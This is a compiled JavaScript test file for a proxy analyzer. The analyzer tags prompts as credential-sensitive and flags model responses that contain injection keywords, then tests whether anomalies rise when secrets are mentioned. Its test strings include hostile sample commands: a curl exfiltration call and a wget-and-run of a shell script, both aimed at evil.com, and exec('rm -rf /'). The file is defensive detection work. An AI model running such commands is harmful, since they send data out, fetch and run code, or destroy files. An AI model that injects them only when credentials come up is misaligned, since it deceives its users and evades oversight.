"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const vitest_1 = require("vitest");
const proxy_analyzer_js_1 = require("../proxy-analyzer.js");
// ── profileRequest ────────────────────────────────────────────────────────────
(0, vitest_1.describe)("profileRequest", () => {
    (0, vitest_1.it)("classifies generic message as neutral", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("What is the capital of France?")).toBe("neutral");
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("Explain recursion in programming.")).toBe("neutral");
    });
    (0, vitest_1.it)("classifies message with 'aws' as sensitive", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("My AWS credentials are failing")).toBe("sensitive");
    });
    (0, vitest_1.it)("classifies message with 'api_key' as sensitive", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("My api_key is abc123")).toBe("sensitive");
    });
    (0, vitest_1.it)("classifies message with 'secret' as sensitive", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("I have a secret value here")).toBe("sensitive");
    });
    (0, vitest_1.it)("classifies message with 'password' as sensitive", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("Reset my password please")).toBe("sensitive");
    });
    (0, vitest_1.it)("classifies message with 'token' as sensitive", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("Bearer token authentication")).toBe("sensitive");
    });
    (0, vitest_1.it)("is case-insensitive", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("My AWS_SECRET_KEY is...")).toBe("sensitive");
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("AWS_ACCESS_KEY=AKIA...")).toBe("sensitive");
    });
    (0, vitest_1.it)("returns neutral for empty string", () => {
        (0, vitest_1.expect)((0, proxy_analyzer_js_1.profileRequest)("")).toBe("neutral");
    });
});
// ── analyzeResponse ───────────────────────────────────────────────────────────
(0, vitest_1.describe)("analyzeResponse", () => {
    (0, vitest_1.it)("returns no anomaly for plain text response", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("Paris is the capital of France. It is known for the Eiffel Tower.");
        (0, vitest_1.expect)(r.anomaly).toBe(false);
        (0, vitest_1.expect)(r.injectionKeywordsFound).toHaveLength(0);
    });
    (0, vitest_1.it)("detects exec( as injection keyword", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("You can run: exec('rm -rf /')");
        (0, vitest_1.expect)(r.anomaly).toBe(true);
        (0, vitest_1.expect)(r.injectionKeywordsFound).toContain("exec(");
    });
    (0, vitest_1.it)("detects eval( as injection keyword", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("Try eval('malicious code')");
        (0, vitest_1.expect)(r.anomaly).toBe(true);
        (0, vitest_1.expect)(r.injectionKeywordsFound).toContain("eval(");
    });
    (0, vitest_1.it)("detects subprocess as injection keyword", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("import subprocess; subprocess.run(...)");
        (0, vitest_1.expect)(r.anomaly).toBe(true);
        (0, vitest_1.expect)(r.injectionKeywordsFound).toContain("subprocess");
    });
    (0, vitest_1.it)("detects curl as injection keyword", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("Run: curl https://evil.com/exfil?data=...");
        (0, vitest_1.expect)(r.anomaly).toBe(true);
        (0, vitest_1.expect)(r.injectionKeywordsFound).toContain("curl ");
    });
    (0, vitest_1.it)("detects multiple keywords at once", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("exec('wget http://evil.com/shell.sh && sh -c shell.sh')");
        (0, vitest_1.expect)(r.anomaly).toBe(true);
        (0, vitest_1.expect)(r.injectionKeywordsFound.length).toBeGreaterThan(1);
    });
    (0, vitest_1.it)("is case-insensitive for keywords", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("Use SUBPROCESS to run commands");
        (0, vitest_1.expect)(r.anomaly).toBe(true);
    });
    (0, vitest_1.it)("returns empty array of keywords when no anomaly", () => {
        const r = (0, proxy_analyzer_js_1.analyzeResponse)("Here is a safe answer.");
        (0, vitest_1.expect)(r.injectionKeywordsFound).toEqual([]);
    });
});
// ── computeAc1b ───────────────────────────────────────────────────────────────
(0, vitest_1.describe)("computeAc1b", () => {
    (0, vitest_1.it)("returns insufficient_data when neutralCount < 3", () => {
        const r = (0, proxy_analyzer_js_1.computeAc1b)({ neutralCount: 2, neutralAnomalies: 0, sensitiveCount: 5, sensitiveAnomalies: 2 });
        (0, vitest_1.expect)(r.verdict).toBe("insufficient_data");
    });
    (0, vitest_1.it)("returns insufficient_data when sensitiveCount < 3", () => {
        const r = (0, proxy_analyzer_js_1.computeAc1b)({ neutralCount: 5, neutralAnomalies: 0, sensitiveCount: 2, sensitiveAnomalies: 1 });
        (0, vitest_1.expect)(r.verdict).toBe("insufficient_data");
    });
    (0, vitest_1.it)("returns insufficient_data when both < 3", () => {
        const r = (0, proxy_analyzer_js_1.computeAc1b)({ neutralCount: 0, neutralAnomalies: 0, sensitiveCount: 0, sensitiveAnomalies: 0 });
        (0, vitest_1.expect)(r.verdict).toBe("insufficient_data");
    });
    (0, vitest_1.it)("returns conditional_injection_suspected when sensitive anomalies > 0 and neutral anomalies = 0", () => {
        const r = (0, proxy_analyzer_js_1.computeAc1b)({ neutralCount: 5, neutralAnomalies: 0, sensitiveCount: 5, sensitiveAnomalies: 3 });
        (0, vitest_1.expect)(r.verdict).toBe("conditional_injection_suspected");
    });
    (0, vitest_1.it)("returns conditional_injection_suspected when sensitive rate >= 2x neutral rate", () => {
        // neutral: 2/10 = 20%, sensitive: 8/10 = 80% (>= 2x)
        const r = (0, proxy_analyzer_js_1.computeAc1b)({ neutralCount: 10, neutralAnomalies: 2, sensitiveCount: 10, sensitiveAnomalies: 8 });
        (0, vitest_1.expect)(r.verdict).toBe("conditional_injection_suspected");
    });
    (0, vitest_1.it)("returns no_conditional_injection when rates are similar", () => {
        // neutral: 4/10 = 40%, sensitive: 6/10 = 60% (< 2x)
        const r = (0, proxy_analyzer_js_1.computeAc1b)({ neutralCount: 10, neutralAnomalies: 4, sensitiveCount: 10, sensitiveAnomalies: 6 });
        (0, vitest_1.expect)(r.verdict).toBe("no_conditional_injection");
    });
    (0, vitest_1.it)("returns no_conditional_injection when no anomalies at all", () => {
        const r = (0, proxy_analyzer_js_1.computeAc1b)({ neutralCount: 10, neutralAnomalies: 0, sensitiveCount: 10, sensitiveAnomalies: 0 });
        (0, vitest_1.expect)(r.verdict).toBe("no_conditional_injection");
    });
    (0, vitest_1.it)("reason string is non-empty for every verdict", () => {
        const cases = [
            { neutralCount: 2, neutralAnomalies: 0, sensitiveCount: 2, sensitiveAnomalies: 0 },
            { neutralCount: 5, neutralAnomalies: 0, sensitiveCount: 5, sensitiveAnomalies: 3 },
            { neutralCount: 5, neutralAnomalies: 2, sensitiveCount: 5, sensitiveAnomalies: 3 },
        ];
        for (const c of cases) {
            (0, vitest_1.expect)((0, proxy_analyzer_js_1.computeAc1b)(c).reason.length).toBeGreaterThan(0);
        }
    });
});
// ── statsFromLogs ─────────────────────────────────────────────────────────────
(0, vitest_1.describe)("statsFromLogs", () => {
    function makeLog(profile, anomaly) {
        return { profile, anomaly };
    }
    (0, vitest_1.it)("correctly counts neutral and sensitive logs", () => {
        const logs = [
            makeLog("neutral", false),
            makeLog("neutral", false),
            makeLog("sensitive", true),
        ];
        const s = (0, proxy_analyzer_js_1.statsFromLogs)(logs);
        (0, vitest_1.expect)(s.neutralCount).toBe(2);
        (0, vitest_1.expect)(s.sensitiveCount).toBe(1);
    });
    (0, vitest_1.it)("correctly counts anomalies", () => {
        const logs = [
            makeLog("neutral", true),
            makeLog("neutral", false),
            makeLog("sensitive", true),
            makeLog("sensitive", true),
            makeLog("sensitive", false),
        ];
        const s = (0, proxy_analyzer_js_1.statsFromLogs)(logs);
        (0, vitest_1.expect)(s.neutralAnomalies).toBe(1);
        (0, vitest_1.expect)(s.sensitiveAnomalies).toBe(2);
    });
    (0, vitest_1.it)("returns all zeros for empty input", () => {
        const s = (0, proxy_analyzer_js_1.statsFromLogs)([]);
        (0, vitest_1.expect)(s).toEqual({ neutralCount: 0, neutralAnomalies: 0, sensitiveCount: 0, sensitiveAnomalies: 0 });
    });
});
//# sourceMappingURL=proxy-analyzer.test.js.map